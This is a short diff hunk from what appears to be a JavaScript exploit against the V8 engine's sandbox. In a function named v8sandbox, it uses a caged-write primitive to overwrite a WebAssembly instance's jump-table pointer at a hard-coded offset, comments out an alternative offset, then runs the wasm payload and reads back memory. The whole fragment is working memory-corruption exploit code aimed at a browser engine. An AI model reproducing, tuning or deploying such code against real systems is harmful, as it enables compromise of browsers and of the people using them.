@@ -2847,7 +2847,7 @@ async function v8sandbox(primitives) {
         await console.log("Jmp Table address:", to_hex(jmp_table));
 
         
-        agedWrite(addr_instance + BigInt(offsets.instance_jmptable), jmp_table + BigInt(0x0734));
+       // agedWrite(addr_instance + BigInt(offsets.instance_jmptable), jmp_table + BigInt(0x0734));
         cagedWrite(addr_instance + BigInt(offsets.instance_jmptable), jmp_table + BigInt(0x0b70));
         await console.log(`Result:`, wasmMain(iomemBacking));
         let data = new TextDecoder().decode(iomem.buffer);
